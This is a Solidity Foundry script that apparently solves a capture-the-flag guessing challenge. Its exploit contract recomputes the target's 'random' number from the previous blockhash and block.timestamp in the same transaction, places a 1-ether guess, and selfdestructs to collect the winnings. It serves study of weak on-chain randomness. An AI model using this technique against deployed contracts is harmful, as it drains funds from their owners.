// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/Script.sol";

interface IChallenge {
    function guess(uint8 n) external payable;
}

contract ExploitScript is Script {
    function run(address instanceAddress) public {
        vm.broadcast();
        new Exploit{value: 1 ether}(instanceAddress);
    }
}

contract Exploit {
    constructor(address instanceAddress) payable {
        IChallenge(instanceAddress).guess{value: 1 ether}(
            uint8(uint256(keccak256(abi.encode(blockhash(block.number - 1), block.timestamp))))
        );
        selfdestruct(payable(msg.sender));
    }
}
